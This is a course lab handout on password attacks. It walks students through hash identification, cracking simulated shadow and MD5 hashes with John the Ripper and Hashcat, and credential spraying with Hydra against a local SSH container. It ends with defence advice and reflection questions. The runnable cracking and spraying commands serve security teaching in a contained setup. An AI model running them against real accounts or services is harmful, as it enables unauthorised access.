---
title: "Lab 07 — Password Attacks & Credential Exploitation"
course: SCIA-472
week: 8
difficulty: "⭐⭐⭐"
time: "75-90 min"
---

# Lab 07 — Password Attacks & Credential Exploitation

**Course:** SCIA-472 | **Week:** 8 | **Difficulty:** ⭐⭐⭐ | **Time:** 75-90 min

---

## Overview

Passwords remain the number-one credential attack vector in breach reports. In this lab, students identify hash formats, crack Linux shadow file hashes with John the Ripper (dictionary and rule-based), crack MD5/NTLM hashes with Hashcat (dictionary and mask attacks), and perform credential spraying against an SSH target with Hydra. The final section covers why slow hashing algorithms and MFA matter more than password complexity rules.

!!! note "Lab Note — Week 7 Hardware Lab"
    Wireless WPA2 handshake cracking (Week 7 curriculum topic) requires physical hardware with a monitor-mode capable wireless adapter. That activity is completed in the Thursday hands-on session. This lab covers the Week 8 password attack methods, which are fully demonstrable in Docker.

---

!!! warning "Ethical Use — Read Before Proceeding"
    Password cracking tools and credential spraying tools are dual-use. Running Hydra, John, or Hashcat against systems you do not own — or accounts you do not control — is a federal crime. **All targets in this lab are containers you created on your own machine.** Never credential-spray external services, cloud APIs, or any accounts belonging to others.

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (7 checkpoints) | 40 pts |
    | Attack technique comparison table | 20 pts |
    | Reflection questions (4 × 10 pts) | 40 pts |
    | **Total** | **100 pts** |

---

## Part 1 — Hash Identification

### Step 1.1 — Generate and compare hash formats

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq python3 2>/dev/null
python3 -c \"
import hashlib
password = 'password123'
print('Original:', password)
print()
print('MD5:    ', hashlib.md5(password.encode()).hexdigest())
print('SHA-1:  ', hashlib.sha1(password.encode()).hexdigest())
print('SHA-256:', hashlib.sha256(password.encode()).hexdigest())
print()
import crypt
print('SHA-512 crypt (Linux shadow):')
print(crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512)))
print()
print('Hash format identifiers:')
print('  MD5:         32 hex chars')
print('  SHA-1:       40 hex chars')
print('  SHA-256:     64 hex chars')
print('  SHA-512:     128 hex chars')
print('  SHA-512crypt: starts with \$6\$')
print('  yescrypt:    starts with \$y\$')
print('  bcrypt:      starts with \$2b\$')
\""
```

> 📸 **Screenshot 07a** — Capture all four hash outputs and the format identifier table.

### Step 1.2 — Generate a realistic shadow file

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq python3 2>/dev/null
python3 -c \"
import crypt
users = [
    ('alice', 'password'),
    ('bob',   'password123'),
    ('carol', 'letmein'),
    ('dave',  'qwerty'),
    ('eve',   'sunshine'),
]
print('# Simulated /etc/shadow format (SHA-512 crypt)')
for user, pw in users:
    h = crypt.crypt(pw, crypt.mksalt(crypt.METHOD_SHA512))
    print(f'{user}:{h}:19000:0:99999:7:::')
\""
```

Save this output to `/tmp/shadow_test.txt` for reference. Note the `$6$` prefix on each hash — that identifies SHA-512 crypt.

> 📸 **Screenshot 07b** — Capture the shadow file output showing usernames and `$6$` hashes.

---

## Part 2 — John the Ripper

### Step 2.1 — Dictionary attack against shadow file

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq john python3 2>/dev/null
python3 -c \"
import crypt
users = [('alice','password'),('bob','password123'),('carol','letmein')]
for u,p in users:
    h = crypt.crypt(p, crypt.mksalt(crypt.METHOD_SHA512))
    print(f'{u}:{h}:19000:0:99999:7:::')
\" > /tmp/shadow.txt
echo '=== Shadow file created ==='
cat /tmp/shadow.txt | cut -d: -f1,2 | cut -c1-50
echo ''
echo '=== Cracking with John... ==='
john /tmp/shadow.txt --wordlist=/usr/share/john/password.lst 2>&1
echo ''
echo '=== Results ==='
john /tmp/shadow.txt --show 2>&1"
```

**Expected output:** John recovers `password` (alice) and `letmein` (carol) immediately; `password123` (bob) may also be cracked if it appears in the wordlist.

> 📸 **Screenshot 07c** — Capture the `john --show` results listing cracked passwords.

### Step 2.2 — Rule-based cracking for complex passwords

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq john python3 2>/dev/null
python3 -c \"
import crypt
# Harder passwords - need rules
users = [('user1','Password1!'),('user2','Welcome1')]
for u,p in users:
    h = crypt.crypt(p, crypt.mksalt(crypt.METHOD_SHA512))
    print(f'{u}:{h}:19000:0:99999:7:::')
\" > /tmp/hard_shadow.txt
echo '=== Cracking with rules... ==='
john /tmp/hard_shadow.txt --wordlist=/usr/share/john/password.lst --rules=best64 2>&1
john /tmp/hard_shadow.txt --show 2>&1"
```

**Expected output:** The `best64` rule set applies transformations such as capitalizing the first letter and appending digits/symbols — cracking `Password1!` and `Welcome1`.

> 📸 **Screenshot 07d** — Capture the rule-based results showing cracked passwords for user1/user2.

---

## Part 3 — Hashcat (MD5 and Mask Attacks)

### Step 3.1 — Dictionary attack on MD5 hashes

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq hashcat 2>/dev/null
# Create MD5 hash file
printf '%s
%s
%s
' \
  '5f4dcc3b5aa765d61d8327deb882cf99' \
  'e10adc3949ba59abbe56e057f20f883e' \
  'fa5c89a7cad4e26131c1ad00c86e9bcd' > /tmp/md5hashes.txt
cat /tmp/md5hashes.txt
echo ''
echo '=== Creating wordlist ==='
printf 'password
123456
letmein
welcome
qwerty
admin
' > /tmp/wordlist.txt
echo '=== Cracking MD5 hashes... ==='
hashcat -m 0 -a 0 /tmp/md5hashes.txt /tmp/wordlist.txt \
  --force --potfile-disable 2>&1 | grep -E 'Recovered|password|[0-9a-f]{32}:' | head -15"
```

**Expected output:** Cracks `5f4dcc...` → `password` and `e10adc...` → `123456`. The third hash (`fa5c89...`) is `letmein`.

> 📸 **Screenshot 07e** — Capture the Hashcat output showing cracked MD5 hashes with plaintext values.

### Step 3.2 — Mask attack (pattern-based brute force)

```bash
docker run --rm ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq hashcat python3 2>/dev/null
python3 -c "import hashlib; print(hashlib.md5(b'Summer23').hexdigest())" > /tmp/season_hash.txt
cat /tmp/season_hash.txt
echo '=== Mask attack: ?u?l?l?l?l?l?d?d (Capital+5lower+2digit) ==='
hashcat -m 0 -a 3 /tmp/season_hash.txt '?u?l?l?l?l?l?d?d' \
  --force --potfile-disable 2>&1 | grep -E 'Recovered|Summer|[0-9a-f]{32}:' | head -10"
```

**Expected output:** Hashcat recovers `Summer23` using the `?u?l?l?l?l?l?d?d` mask (1 uppercase + 5 lowercase + 2 digits).

> 📸 **Screenshot 07f** — Capture the mask attack result showing `Summer23` recovered.

---

## Part 4 — Hydra Credential Spraying

### Step 4.1 — Set up SSH target with known accounts

```bash
docker network create hydra-lab
docker run -d --name ssh-target --network hydra-lab ubuntu:22.04 bash -c "
  apt-get update -qq && apt-get install -y -qq openssh-server 2>/dev/null
  useradd -m alice && echo 'alice:Spring2024' | chpasswd
  useradd -m bob   && echo 'bob:password123'  | chpasswd
  useradd -m carol && echo 'carol:admin123'   | chpasswd
  mkdir -p /run/sshd && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
  ssh-keygen -A -q && /usr/sbin/sshd -D"
sleep 8
docker inspect ssh-target | grep '"IPAddress"' | tail -1
```

### Step 4.2 — Credential spraying with Hydra

```bash
TARGET_IP=$(docker inspect ssh-target --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "Target: $TARGET_IP"
printf 'password\n123456\npassword123\nadmin123\nletmein\nSpring2024\n' > /tmp/passwords.txt
printf 'alice\nbob\ncarol\nadmin\nroot\n' > /tmp/users.txt
docker run --rm --network hydra-lab ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq hydra 2>/dev/null
hydra -L /tmp/users.txt -P /tmp/passwords.txt \
  $TARGET_IP ssh \
  -t 4 -W 3 -o /tmp/hydra_results.txt 2>&1 | \
  grep -E 'host:|\[ssh\]|login:|Hydra v|successfully' | head -15" 2>/dev/null || \
docker run --rm --network hydra-lab \
  -v /tmp/passwords.txt:/tmp/passwords.txt \
  -v /tmp/users.txt:/tmp/users.txt \
  ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq hydra 2>/dev/null
hydra -L /tmp/users.txt -P /tmp/passwords.txt $TARGET_IP ssh -t 4 -W 3 2>&1 | grep -E 'login|host|found' | head -10"
```

**Expected output:** Hydra reports valid credentials for `bob:password123` and `carol:admin123` (and possibly `alice:Spring2024`).

> 📸 **Screenshot 07g** — Capture the Hydra output showing discovered valid credentials.

---

## Part 5 — Defense Recommendations

### Step 5.1 — Password attack defense summary

```bash
docker run --rm python:3.11-slim python3 -c "
print('=== PASSWORD ATTACK DEFENSES ===')
print()
print('1. ACCOUNT LOCKOUT (defeats brute-force and spraying)')
print('   - Lock after 5-10 failed attempts')
print('   - Progressive delays (1s, 2s, 4s...)')
print('   - Alert SOC on lockout events')
print()
print('2. MULTI-FACTOR AUTHENTICATION (defeats credential stuffing)')
print('   - Even if password cracked, attacker needs 2nd factor')
print('   - SMS/TOTP/hardware key')
print()
print('3. STRONG PASSWORD POLICY (slows cracking)')
print('   - Minimum 12+ characters')
print('   - Reject common passwords (blocklist)')
print('   - bcrypt/Argon2 for storage (slow hashing)')
print()
print('4. CREDENTIAL MONITORING')
print('   - Check HaveIBeenPwned API against your user base')
print('   - Force reset on leaked passwords')
print()
print('HASHCAT SPEED COMPARISON (1x GPU A100):')
print('  MD5:        100+ BILLION hashes/sec  - USELESS for passwords')
print('  SHA-256:    10+ BILLION hashes/sec   - USELESS for passwords')
print('  bcrypt:     ~200,000 hashes/sec      - Acceptable')
print('  Argon2:     ~100,000 hashes/sec      - Recommended')
"
```

> 📸 **Screenshot 07h** — Capture the defense summary including the Hashcat speed comparison table.

---

## Cleanup

```bash
docker stop ssh-target && docker rm ssh-target
docker network rm hydra-lab
rm -f /tmp/passwords.txt /tmp/users.txt /tmp/md5hashes.txt
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all screenshots labeled exactly as shown:

- [ ] **07a** — Hash samples and format identifiers (MD5/SHA-1/SHA-256/SHA-512crypt)
- [ ] **07b** — Simulated shadow file with `$6$` hashes
- [ ] **07c** — John the Ripper cracking shadow file (passwords recovered)
- [ ] **07d** — John rule-based cracking (Password1!/Welcome1 cracked)
- [ ] **07e** — Hashcat MD5 dictionary attack (hashes cracked with plaintext)
- [ ] **07f** — Hashcat mask attack (`Summer23` recovered)
- [ ] **07g** — Hydra finding valid SSH credentials
- [ ] **07h** — Password defense recommendations with hash speed comparison

---

## Reflection Questions

Answer each question in **150-250 words**. Submit as a separate document.

1. **bcrypt work factor:** Hashcat cracks MD5 at over 100 billion hashes per second but bcrypt at only ~200,000 hashes per second. Why is this enormous speed difference a deliberate **security feature** of bcrypt rather than a flaw? What is a "work factor" (cost factor), and how does doubling the work factor affect cracking time for attackers versus login time for legitimate users?

2. **Credential spraying detection:** Hydra performed credential spraying — trying a small number of common passwords across many different accounts. Explain why this technique is specifically designed to be harder to detect than traditional brute-force (many passwords against one account). What logging-based detection method is most effective at identifying spraying attacks, and what threshold would trigger an alert?

3. **Complexity vs. length:** John the Ripper's `best64` ruleset cracked `Password1!` by capitalizing the first letter and appending a symbol — a password that technically meets most complexity policies. What does this demonstrate about how users actually behave when forced to meet complexity requirements? Why have NIST SP 800-63B and most modern compliance frameworks shifted away from mandating complexity in favor of minimum length and breach-list checking?

4. **Salted hash cracking:** You cracked `bob`'s SHA-512-crypt hashed password `password123`. The shadow file entry includes a unique per-user salt embedded in the `$6$...` prefix. If each user has a different salt, explain why an attacker can still crack the hash — what is the attacker actually computing? How does the Hashcat offline approach differ fundamentally from using an online cracking service like CrackStation?

---

*SCIA-472 | Week 8 | All activity confined to local Docker environment*
